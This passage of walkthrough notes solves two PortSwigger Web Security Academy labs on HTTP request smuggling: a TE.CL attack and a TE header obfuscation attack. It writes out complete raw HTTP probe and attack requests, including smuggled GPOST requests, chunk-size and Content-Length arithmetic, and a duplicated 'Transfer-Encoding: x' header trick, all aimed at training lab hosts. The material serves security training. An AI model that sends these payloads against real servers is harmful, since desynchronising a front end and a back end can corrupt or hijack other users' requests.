- The request is rejected by the front-end. This is because when the front-end parses the request as a series of chunks, it encounters a chunk of invalid size `X`, and therefore rejects the request. This also means either TE.CL or TE.TE vulnerability. 

- Send another detection request:

```http
POST / HTTP/1.1
Host: 0a08000f045e2cd480cf5d0000a100e0.web-security-academy.net
Cookie: session=V4zbTQloHQbRb0UPiw8tQQxpcmq16Zzx
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0␍␊
␍␊
X
```

![[images/walkthrough/PortSwigger/HRS/lab14/2.png]]

- You get a timeout, because the backend still expects the last byte, `X`, to fit the specified `Content-Length`. The front-end didn't pass it, because it uses `chunked` encoding, and `0␍␊␍␊` indicates the end of a chunked request body.
- To confirm the vulnerability, send the following requests one immediately after another:

- Attack request:

```http
POST / HTTP/1.1
Host: 0a08000f045e2cd480cf5d0000a100e0.web-security-academy.net
Cookie: session=V4zbTQloHQbRb0UPiw8tQQxpcmq16Zzx
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

1␍␊
G␍␊
0␍␊
␍␊
```

- Normal request:

```http
POST / HTTP/1.1
Host: 0a08000f045e2cd480cf5d0000a100e0.web-security-academy.net
Cookie: session=V4zbTQloHQbRb0UPiw8tQQxpcmq16Zzx
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

foo=bar

```

- Make sure you get `200 OK` for both the attack and normal requests:

![[images/walkthrough/PortSwigger/HRS/lab14/3.png]]

![[images/walkthrough/PortSwigger/HRS/lab14/4.png]]

- Then send in sequence:

![[images/walkthrough/PortSwigger/HRS/lab14/5.png]]

- You see `Unrecognized method G0POST`. This is because when we send our attack request, it is sent to the front-end server which reads the whole of it and sends to the back-end, but the backend only reads one byte and stores `G␍␊0␍␊␍␊` in the connection buffer (poisoned). When a normal `POST` request is sent, these bytes are appended. 

- To turn `G0POST` to `GPOST`, modify the attack request:

![[images/walkthrough/PortSwigger/HRS/lab14/6.png]]

**Fixing lengths:**

- Go to `Inspector` on the right, select the `0␍␊␍␊` and see its size is `5`. Change `Content-Length` of the smuggled request from `3` to `5`:

![[images/walkthrough/PortSwigger/HRS/lab14/7.png]]

- Select the headers of the smuggled request and see it is `56` (hex). Add the chunk size:

![[images/walkthrough/PortSwigger/HRS/lab14/8.png]]

- Then fix the `Content-Length` of the initial request by setting it to `4`:

![[images/walkthrough/PortSwigger/HRS/lab14/9.png]]

```http
POST / HTTP/1.1
Host: 0a08000f045e2cd480cf5d0000a100e0.web-security-academy.net
Cookie: session=V4zbTQloHQbRb0UPiw8tQQxpcmq16Zzx
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
␍␊
56␍␊
GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 5␍␊
␍␊
0␍␊
␍␊
```


- Send this request. Then switch to the normal request and send it, too.

![[images/walkthrough/PortSwigger/HRS/lab14/10.png]]

- For the normal request, you get `200 OK`.
- Now, if you change `Content-Length` of the smuggled request in the attack request from `5` to `6`, then send the normal request again, you get `Unrecognized method GPOST`.

![[images/walkthrough/PortSwigger/HRS/lab14/11.png]]

![[images/walkthrough/PortSwigger/HRS/lab14/solved.png]]

Solved!

## 15. HTTP request smuggling, obfuscating the TE header

>[!done]

>[!note]+ Lab description
> - [`Lab: HTTP request smuggling, obfuscating the TE header`](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the `GET` or `POST` method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

### Solution

- First, send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send a first probe request:

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
ABC
X
```

![[images/walkthrough/PortSwigger/HRS/lab15/1.png]]

- You get `400 Bad Request` with `"Invalid request"` error message (rejected by the front-end). This indicates the front-end server uses `Transfer-Encoding: chunked` to parse requests (`TE.CL` or `TE.TE`; the front-end server tries read `X` as the next chunk size in hex, but rejects it as an invalid hex number).

![[detecting_HRS.svg]]

- Send another probe:

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

![[images/walkthrough/PortSwigger/HRS/lab15/2.png]]

- You get a normal response from the back-end (`200 OK`), which means it's either `CL.CL` or `TE.TE`. If it's `CL.CL`, the application is not vulnerable, but in case of `TE.TE`, there may be some way to obfuscate one of the `TE` headers to turn this into either `CL.TE` or `TE.CL`.

- Start by applying different `Transfer-Encoding: chunked` obfuscation techniques to the previous probe, such as duplicating the header and setting one of the instances to an invalid value:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x 
```

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0

X
```

![[images/walkthrough/PortSwigger/HRS/lab15/3.png]]

- You get a timeout from the back-end, which means it used `Content-Length`.
- The front-end server is more lenient in what it accepts, so it uses `Transfer-Encoding` and lets a request with two headers pass through to the backend — yet drops the last `X`, considering the request complete after `0\r\n\r\n`. 
- The back-end, however, rejects the malformed headers and uses `Content-Length` instead, so it ends up waiting for the last by to arrive until it times out. This points to `TE.CL` we will be dealing with from now on.

To construct the attack request — and `smuggle GPOST`:

1. Insert the request you want to smuggle before the `0` chunk (leave a CRLF after the request); remove the final `X`:

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 5␍␊
␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab15/4.png]]

2. Calculate the size of the smuggled request in hex and add it as a chunk size (do not including the final CRLF before `0`):

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

56␍␊
GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 5␍␊
␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab15/5.png]]

3. Set the `Content-Length` in the original request to the size of the bytes used to mark the first chunk's size + CRLF (`56` of `2` bytes + CRLF of `2` bytes = `4` bytes):

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

56␍␊
GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 5␍␊
␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab15/6.png]]

- Then send the request. See you get a normal response:

![[images/walkthrough/PortSwigger/HRS/lab15/7.png]]

- You don't see the `Invalid method` error, but the `GPOST` request is sent under the hood. 
- To see it, change `Content-Length` in the smuggled request from `5` to `6` and send the request twice:

```http
POST / HTTP/1.1
Host: 0a61005904b432e48027530800ec008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

56␍␊
GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 6␍␊
␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab15/8.png]]


![[images/walkthrough/PortSwigger/HRS/lab15/solved.png]]

Solved!